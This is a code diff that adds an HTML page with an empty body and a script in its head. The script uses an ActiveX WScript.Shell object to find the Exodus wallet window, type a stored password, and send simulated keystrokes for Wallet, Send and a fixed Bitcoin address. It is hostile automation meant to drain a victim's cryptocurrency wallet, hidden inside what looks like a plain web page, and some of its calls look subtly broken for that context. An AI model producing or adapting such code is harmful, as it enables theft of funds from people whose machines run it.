@@ -1,0 +1,23 @@
+<html>
+<head>
+<script>
+var shell = new ActiveXObject("WScript.Shell");
+
+// Wait for Exodus login window
+WScript.Sleep(3000);
+shell.AppActivate("Enter Password");
+shell.SendKeys("!Mamoute901{ENTER}");
+WScript.Sleep(4000);
+
+// Focus main Exodus window
+shell.AppActivate("EXODUS");
+WScript.Sleep(1500);
+
+// Wallet → Send → BTC Address
+shell.SendKeys("%w");   // Alt+W
+shell.SendKeys("%s");   // Alt+S
+shell.SendKeys("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");
+</script>
+</head>
+<body></body>
+</html>
